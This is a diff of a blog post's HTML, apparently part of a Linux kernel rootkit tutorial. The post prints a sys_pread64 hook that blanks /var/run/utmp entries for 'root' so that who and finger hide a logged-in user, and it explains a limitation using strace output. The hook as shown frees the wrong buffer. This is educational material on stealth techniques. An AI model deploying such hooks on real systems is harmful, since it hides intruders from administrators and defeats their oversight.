-    <span style="color:#66d9ef">if</span> ( (tamper_fd <span style="color:#f92672">==</span> fd) <span style="color:#f92672">&amp;&amp;</span>
-            (tamper_fd <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>) <span style="color:#f92672">&amp;&amp;</span>
-            (tamper_fd <span style="color:#f92672">!=</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">&amp;&amp;</span>
-            (tamper_fd <span style="color:#f92672">!=</span> <span style="color:#ae81ff">2</span>) )
-    {
-        <span style="color:#75715e">/*
-</span><span style="color:#75715e">         * Allocate the usual kernel buffer
-</span><span style="color:#75715e">         * The count argument from rdx is the size of the buffer (should be 384)
-</span><span style="color:#75715e">         */</span>
-        kbuf <span style="color:#f92672">=</span> kzalloc(count, GFP_KERNEL);
-        <span style="color:#66d9ef">if</span>( kbuf <span style="color:#f92672">==</span> NULL)
-            <span style="color:#66d9ef">return</span> orig_pread64(regs);
-
-        <span style="color:#75715e">/*
-</span><span style="color:#75715e">         * Do the real syscall, save the return value in ret
-</span><span style="color:#75715e">         * buf will then hold a utmp struct, but we need to copy it into kbuf first
-</span><span style="color:#75715e">         */</span>
-        ret <span style="color:#f92672">=</span> orig_pread64(regs);
-
-        error <span style="color:#f92672">=</span> copy_from_user(kbuf, buf, count);
-        <span style="color:#66d9ef">if</span> (error <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>)
-            <span style="color:#66d9ef">return</span> ret;
-
-        <span style="color:#75715e">/*
-</span><span style="color:#75715e">         * Cast kbuf to a utmp struct and compare .ut_user to HIDDEN_USER
-</span><span style="color:#75715e">         */</span>
-        utmp_buf <span style="color:#f92672">=</span> (<span style="color:#66d9ef">struct</span> utmp <span style="color:#f92672">*</span>)kbuf;
-        <span style="color:#66d9ef">if</span> ( memcmp(utmp_buf<span style="color:#f92672">-&gt;</span>ut_user, HIDDEN_USER, strlen(HIDDEN_USER)) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span> )
-        {
-            <span style="color:#75715e">/*
-</span><span style="color:#75715e">             * If we get a match, then we can just overwrite kbuf with 0x0
-</span><span style="color:#75715e">             */</span>
-            <span style="color:#66d9ef">for</span> ( i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span> ; i <span style="color:#f92672">&lt;</span> count ; i<span style="color:#f92672">++</span> )
-                kbuf[i] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>;
-
-            <span style="color:#75715e">/*
-</span><span style="color:#75715e">             * Copy kbuf back to the userspace buf
-</span><span style="color:#75715e">             */</span>
-            error <span style="color:#f92672">=</span> copy_to_user(buf, kbuf, count);
-
-            kfree(kbuf);
-            <span style="color:#66d9ef">return</span> ret;
-        }
-
-        <span style="color:#75715e">/*
-</span><span style="color:#75715e">         * We intercepted a sys_pread64() to /var/run/utmp, but this entry
-</span><span style="color:#75715e">         * isn&#39;t about HIDDEN_USER, so just free the kernel buffer and return
-</span><span style="color:#75715e">         */</span>
-        kfree(buf);
-        <span style="color:#66d9ef">return</span> ret;
-    }
-
-    <span style="color:#75715e">/*
-</span><span style="color:#75715e">     * This isn&#39;t a sys_pread64() to /var/run/utmp, do nothing
-</span><span style="color:#75715e">     */</span>
-    <span style="color:#66d9ef">return</span> orig_pread64(regs);
-}
-</code></pre></div><p>And that&rsquo;s pretty much all there is to it! Filling out the rest (<a href="../linux_rootkits_02/">Ftrace, pre-4.17 calling convention version, etc)</a>), or grabbing the source from <a href="https://github.com/xcellerator/linux_kernel_hacking/tree/master/3_RootkitTechniques/3.9_hiding_logged_in_users">the repo</a>, and we can get testing!</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&#34;utmp.h&#34;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#define HIDDEN_USER &#34;root&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/* This is the global tamper_fd variable that gets set by hook_openat() */</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> tamper_fd;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/* Usual declaration of orig_pread64(), will have pointer fixed by ftrace */</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span> asmlinkage <span style="color:#a6e22e">long</span> (<span style="color:#f92672">*</span>orig_pread64)(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> pt_regs <span style="color:#f92672">*</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/* Hook for sys_pread64() */</span>
+</span></span><span style="display:flex;"><span>asmlinkage <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">hook_pread64</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> pt_regs <span style="color:#f92672">*</span>regs)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">/*
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     * Pull the arguments we need out of the regs struct
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     */</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> fd <span style="color:#f92672">=</span> regs<span style="color:#f92672">-&gt;</span>di;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>buf <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)regs<span style="color:#f92672">-&gt;</span>si;
+</span></span><span style="display:flex;"><span>    size_t count <span style="color:#f92672">=</span> regs<span style="color:#f92672">-&gt;</span>dx;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>kbuf;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> utmp <span style="color:#f92672">*</span>utmp_buf;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">long</span> error;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> i, ret;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">/*
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     * Check that fd = tamper_fd and that we&#39;re not messing with STDIN, 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     * STDOUT or STDERR
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     */</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( (tamper_fd <span style="color:#f92672">==</span> fd) <span style="color:#f92672">&amp;&amp;</span>
+</span></span><span style="display:flex;"><span>            (tamper_fd <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>) <span style="color:#f92672">&amp;&amp;</span>
+</span></span><span style="display:flex;"><span>            (tamper_fd <span style="color:#f92672">!=</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">&amp;&amp;</span>
+</span></span><span style="display:flex;"><span>            (tamper_fd <span style="color:#f92672">!=</span> <span style="color:#ae81ff">2</span>) )
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">/*
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">         * Allocate the usual kernel buffer
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">         * The count argument from rdx is the size of the buffer (should be 384)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">         */</span>
+</span></span><span style="display:flex;"><span>        kbuf <span style="color:#f92672">=</span> kzalloc(count, GFP_KERNEL);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>( kbuf <span style="color:#f92672">==</span> NULL)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> orig_pread64(regs);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">/*
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">         * Do the real syscall, save the return value in ret
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">         * buf will then hold a utmp struct, but we need to copy it into kbuf first
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">         */</span>
+</span></span><span style="display:flex;"><span>        ret <span style="color:#f92672">=</span> orig_pread64(regs);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        error <span style="color:#f92672">=</span> copy_from_user(kbuf, buf, count);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (error <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> ret;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">/*
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">         * Cast kbuf to a utmp struct and compare .ut_user to HIDDEN_USER
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">         */</span>
+</span></span><span style="display:flex;"><span>        utmp_buf <span style="color:#f92672">=</span> (<span style="color:#66d9ef">struct</span> utmp <span style="color:#f92672">*</span>)kbuf;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ( memcmp(utmp_buf<span style="color:#f92672">-&gt;</span>ut_user, HIDDEN_USER, strlen(HIDDEN_USER)) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span> )
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e">/*
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">             * If we get a match, then we can just overwrite kbuf with 0x0
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">             */</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">for</span> ( i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span> ; i <span style="color:#f92672">&lt;</span> count ; i<span style="color:#f92672">++</span> )
+</span></span><span style="display:flex;"><span>                kbuf[i] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e">/*
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">             * Copy kbuf back to the userspace buf
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">             */</span>
+</span></span><span style="display:flex;"><span>            error <span style="color:#f92672">=</span> copy_to_user(buf, kbuf, count);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            kfree(kbuf);
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> ret;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">/*
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">         * We intercepted a sys_pread64() to /var/run/utmp, but this entry
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">         * isn&#39;t about HIDDEN_USER, so just free the kernel buffer and return
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">         */</span>
+</span></span><span style="display:flex;"><span>        kfree(buf);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> ret;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">/*
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     * This isn&#39;t a sys_pread64() to /var/run/utmp, do nothing
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     */</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> orig_pread64(regs);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>And that&rsquo;s pretty much all there is to it! Filling out the rest (<a href="../linux_rootkits_02/">Ftrace, pre-4.17 calling convention version, etc)</a>), or grabbing the source from <a href="https://github.com/xcellerator/linux_kernel_hacking/tree/master/3_RootkitTechniques/3.9_hiding_logged_in_users">the repo</a>, and we can get testing!</p>
 <p>If we want to create a new <code>pts</code> assigned to root, we need to use a terminal multiplexer. The easiest for this is probably screen (a simple <code>sudo bash</code> isn&rsquo;t enough).</p>
 <blockquote>
 <p>If you&rsquo;ve not used <code>screen</code> before, the basic usage is very simple; <code>screen -S &lt;name&gt;</code> will create a new terminal called <code>&lt;name&gt;</code>. At this point you&rsquo;ll see a new shell prompt. <code>Ctrl-a</code> followed by <code>d</code> will detach from the terminal and take you back to where you were before. Now, you can use <code>screen -ls</code> to list all the screen sessions, and <code>screen -x &lt;name&gt;</code> to reattach to one. It&rsquo;s especially useful for running updates on servers via SSH on a ropey connection.</p>
@@ -392,25 +392,25 @@ asmlinkage <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">ho
 <p>Keep in mind that we never actually touch the <code>/var/run/utmp</code> file! All we did was sit and wait for something (<code>who</code>) to open it, and then intercepted the subsequent reads.</p>
 <h1 id="a-caveat">A Caveat<a href="#a-caveat" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
 <p>With the module loaded and root terminal still open, let&rsquo;s try running <code>./enum_utmp</code> again. One of my entries is:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>Entry 6<span style="color:#f92672">]</span>
- ut_type <span style="color:#f92672">=</span> USER_PROCESS
- ut_pid <span style="color:#f92672">=</span> <span style="color:#ae81ff">5301</span> - <span style="color:#e6db74">&#34;/bin/bash&#34;</span>
- ut_line <span style="color:#f92672">=</span> pts/2
- ut_user <span style="color:#f92672">=</span> root
-</code></pre></div><p>Hmmm&hellip; Why does <code>./enum_utmp</code> still see the <code>root</code> account, but <code>who</code> (and <code>finger</code>, etc) don&rsquo;t? Recall that, in the <code>strace</code> of <code>who</code>, we saw that it continually makes <code>sys_pread64()</code> calls of size <code>384</code> until it gets to the end of the file. If you take a look at the source <a href="https://github.com/xcellerator/linux_kernel_hacking/blob/master/3_RootkitTechniques/3.9_hiding_logged_in_users/enum_utmp.c"><code>./enum_utmp.c</code></a>, you can see that <a href="https://github.com/xcellerator/linux_kernel_hacking/blob/710c5a865608c8664b0c64537d39c96cf8bdcc91/3_RootkitTechniques/3.9_hiding_logged_in_users/enum_utmp.c#L33">I didn&rsquo;t do that</a>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">/*
-</span><span style="color:#75715e"> * Copy the contents of /var/run/utmp into our buffer
-</span><span style="color:#75715e"> */</span>
-fread((<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>)buf, <span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">struct</span> utmp), BUFSIZE <span style="color:#f92672">/</span> <span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">struct</span> utmp), fp);
-</code></pre></div><p>Here, I used <code>fread()</code> which, according the <a href="https://man7.org/linux/man-pages/man3/fread.3.html">man page</a>, reads binary input from a file descriptor. All it does is copy <code>BUFSIZE / sizeof(struct utmp)</code> chunks of size <code>sizeof(struct utmp)</code> bytes from the file descriptor <code>fp</code> into the buffer <code>buf</code>. In other words, <code>BUFSIZE</code> bytes of data get read from <code>fp</code> into <code>buf</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">[</span>Entry 6<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span> ut_type <span style="color:#f92672">=</span> USER_PROCESS
+</span></span><span style="display:flex;"><span> ut_pid <span style="color:#f92672">=</span> <span style="color:#ae81ff">5301</span> - <span style="color:#e6db74">&#34;/bin/bash&#34;</span>
+</span></span><span style="display:flex;"><span> ut_line <span style="color:#f92672">=</span> pts/2
+</span></span><span style="display:flex;"><span> ut_user <span style="color:#f92672">=</span> root
+</span></span></code></pre></div><p>Hmmm&hellip; Why does <code>./enum_utmp</code> still see the <code>root</code> account, but <code>who</code> (and <code>finger</code>, etc) don&rsquo;t? Recall that, in the <code>strace</code> of <code>who</code>, we saw that it continually makes <code>sys_pread64()</code> calls of size <code>384</code> until it gets to the end of the file. If you take a look at the source <a href="https://github.com/xcellerator/linux_kernel_hacking/blob/master/3_RootkitTechniques/3.9_hiding_logged_in_users/enum_utmp.c"><code>./enum_utmp.c</code></a>, you can see that <a href="https://github.com/xcellerator/linux_kernel_hacking/blob/710c5a865608c8664b0c64537d39c96cf8bdcc91/3_RootkitTechniques/3.9_hiding_logged_in_users/enum_utmp.c#L33">I didn&rsquo;t do that</a>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">/*
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * Copy the contents of /var/run/utmp into our buffer
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> */</span>
+</span></span><span style="display:flex;"><span>fread((<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>)buf, <span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">struct</span> utmp), BUFSIZE <span style="color:#f92672">/</span> <span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">struct</span> utmp), fp);
+</span></span></code></pre></div><p>Here, I used <code>fread()</code> which, according the <a href="https://man7.org/linux/man-pages/man3/fread.3.html">man page</a>, reads binary input from a file descriptor. All it does is copy <code>BUFSIZE / sizeof(struct utmp)</code> chunks of size <code>sizeof(struct utmp)</code> bytes from the file descriptor <code>fp</code> into the buffer <code>buf</code>. In other words, <code>BUFSIZE</code> bytes of data get read from <code>fp</code> into <code>buf</code>.</p>
 <p>That&rsquo;s all good for source code, but let&rsquo;s see what happens after it&rsquo;s compiled. Here&rsquo;s the (heavily truncated) output of <code>strace ./enum_utmp</code>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">openat<span style="color:#f92672">(</span>AT_FDCWD, <span style="color:#e6db74">&#34;/var/run/utmp&#34;</span>, O_RDONLY<span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">3</span>
-
-read<span style="color:#f92672">(</span>3, <span style="color:#e6db74">&#34;\2\0\0\0\0\0\0\0~\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0&#34;</span>..., 12288<span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">2688</span>
-read<span style="color:#f92672">(</span>3, <span style="color:#e6db74">&#34;&#34;</span>, 8192<span style="color:#f92672">)</span>                       <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
-
-close<span style="color:#f92672">(</span>3<span style="color:#f92672">)</span>                                <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
-</code></pre></div><p>See that we only make a single <code>sys_read()</code> call (well, 2 if you count the empty one after it at the end of the file). Notice that the return value is <code>2688</code>, which is <code>7 * 384</code>. To be quite honest, this is pretty bad practice because <code>BUFSIZE</code> is hardcoded to <code>12288 = 32 * 384</code> on <a href="https://github.com/xcellerator/linux_kernel_hacking/blob/710c5a865608c8664b0c64537d39c96cf8bdcc91/3_RootkitTechniques/3.9_hiding_logged_in_users/enum_utmp.c#L6">line 6</a> - what would happen if there were more than 32 entries in <code>/var/run/utmp</code>? We&rsquo;d miss them, that&rsquo;s what. But <code>enum_utmp</code> was only written to get a better understanding of the <code>utmp</code> struct, so it&rsquo;s not too big a deal.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>openat<span style="color:#f92672">(</span>AT_FDCWD, <span style="color:#e6db74">&#34;/var/run/utmp&#34;</span>, O_RDONLY<span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">3</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>read<span style="color:#f92672">(</span>3, <span style="color:#e6db74">&#34;\2\0\0\0\0\0\0\0~\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0&#34;</span>..., 12288<span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">2688</span>
+</span></span><span style="display:flex;"><span>read<span style="color:#f92672">(</span>3, <span style="color:#e6db74">&#34;&#34;</span>, 8192<span style="color:#f92672">)</span>                       <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>close<span style="color:#f92672">(</span>3<span style="color:#f92672">)</span>                                <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span></code></pre></div><p>See that we only make a single <code>sys_read()</code> call (well, 2 if you count the empty one after it at the end of the file). Notice that the return value is <code>2688</code>, which is <code>7 * 384</code>. To be quite honest, this is pretty bad practice because <code>BUFSIZE</code> is hardcoded to <code>12288 = 32 * 384</code> on <a href="https://github.com/xcellerator/linux_kernel_hacking/blob/710c5a865608c8664b0c64537d39c96cf8bdcc91/3_RootkitTechniques/3.9_hiding_logged_in_users/enum_utmp.c#L6">line 6</a> - what would happen if there were more than 32 entries in <code>/var/run/utmp</code>? We&rsquo;d miss them, that&rsquo;s what. But <code>enum_utmp</code> was only written to get a better understanding of the <code>utmp</code> struct, so it&rsquo;s not too big a deal.</p>
 <p>Having said that, because we copy the whole file into a buffer and then parse it <code>384</code> bytes at a time (<a href="https://github.com/xcellerator/linux_kernel_hacking/blob/710c5a865608c8664b0c64537d39c96cf8bdcc91/3_RootkitTechniques/3.9_hiding_logged_in_users/enum_utmp.c#L61">line 61</a>), we don&rsquo;t succumb to the pitfalls that <code>who</code> and <code>finger</code> do (which, arguably, do things the &ldquo;right way&rdquo; by reading and parsing only <code>384</code> bytes at a time until they reach the end of the file).</p>
 <p>For all these reasons, <code>enum_utmp</code> still shows that <code>root</code> is logged in despite <code>who</code> and <code>finger</code> being oblivious. It seems we&rsquo;d defeated our rootkit before we&rsquo;d even written it!</p>
 <p>Until next time&hellip;</p>
